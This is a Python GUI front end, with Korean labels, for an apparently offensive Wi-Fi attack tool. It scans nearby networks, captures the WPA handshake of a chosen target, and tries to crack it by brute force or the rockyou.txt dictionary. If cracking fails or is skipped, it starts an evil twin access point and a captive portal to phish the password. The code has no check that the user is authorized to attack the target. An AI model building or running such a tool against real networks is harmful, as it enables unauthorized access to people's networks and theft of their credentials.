import customtkinter as ctk
import threading

from core.scanner import get_wifi_list
from core.handshake_capture import capture_handshake
from core.cracker import start_crack
from core.evil_twin import start_evil_twin
from core.captive_portal import start_captive_portal

def launch_gui():
    ctk.set_appearance_mode("light")
    ctk.set_default_color_theme("blue")

    root = ctk.CTk()
    root.title("Wi-Fi 공격 시뮬레이터")
    root.geometry("500x400")

    wifi_data = get_wifi_list()
    ssid_display_list = [f"{ap['SSID']} ({ap['BSSID']})" for ap in wifi_data if ap['SSID']]
    wifi_dropdown = ctk.CTkComboBox(root, values=ssid_display_list)
    wifi_dropdown.set("Wi-Fi 선택")
    wifi_dropdown.pack(pady=20)

    status_label = ctk.CTkLabel(root, text="상태: 대기 중")
    status_label.pack(pady=10)

    crack_type_label = ctk.CTkLabel(root, text="크랙 방식 선택")
    crack_type_label.pack(pady=5)

    crack_type = ctk.CTkComboBox(
        root,
        values=[
            "1. 숫자 무차별 대입",
            "2. 영어 무차별 대입 (최대 7자리)",
            "3. 영어+숫자 조합 (최대 5자리+4자리)",
            "4. rockyou.txt 딕셔너리",
            "5. 스킵"
        ]
    )
    crack_type.set("1. 숫자 무차별 대입")
    crack_type.pack(pady=5)

    def update_status(msg):
        # tkinter-safe 업데이트
        root.after(0, lambda: status_label.configure(text=msg))

    def run_attack(selected_bssid, selected_crack_type_index):
        selected_ap = next((ap for ap in wifi_data if ap['BSSID'] == selected_bssid), None)
        if not selected_ap:
            update_status("AP 정보를 찾을 수 없습니다.")
            return

        ssid = selected_ap['SSID']
        bssid = selected_ap['BSSID']
        channel = selected_ap['CHAN']
        interface = "wlan0"
        output_file = "handshake"

        update_status(f"{ssid}에서 Handshake 캡처 중...")
        capture_handshake(bssid, channel, interface, output_file)

        if selected_crack_type_index == 5:
            update_status("크랙 스킵됨, Evil Twin으로 전환 중...")
            threading.Thread(target=start_evil_twin, args=(ssid, bssid, channel, interface), daemon=True).start()
            update_status("Captive Portal 시작 중...")
            start_captive_portal()
            return

        update_status("크랙 시도 중...")

        crack_result = start_crack(
            cap_file_path=output_file + ".cap",
            method=selected_crack_type_index,
            status_callback=update_status
        )

        if crack_result:
            update_status(f"비밀번호 찾음: {crack_result}")
        else:
            update_status("크랙 실패, Evil Twin으로 전환 중...")
            threading.Thread(target=start_evil_twin, args=(ssid, bssid, channel, interface), daemon=True).start()
            update_status("Captive Portal 시작 중...")
            start_captive_portal()

    def on_attack_button_click():
        selected_text = wifi_dropdown.get()
        if not selected_text or "(" not in selected_text:
            update_status("Wi-Fi를 선택하세요.")
            return

        selected_bssid = selected_text.split("(")[-1].rstrip(")")
        selected_crack_type_index = int(crack_type.get().split(".")[0])
        update_status("공격 시작 중...")
        threading.Thread(target=run_attack, args=(selected_bssid, selected_crack_type_index), daemon=True).start()

    attack_button = ctk.CTkButton(root, text="공격 시작", command=on_attack_button_click)
    attack_button.pack(pady=10)

    root.mainloop()
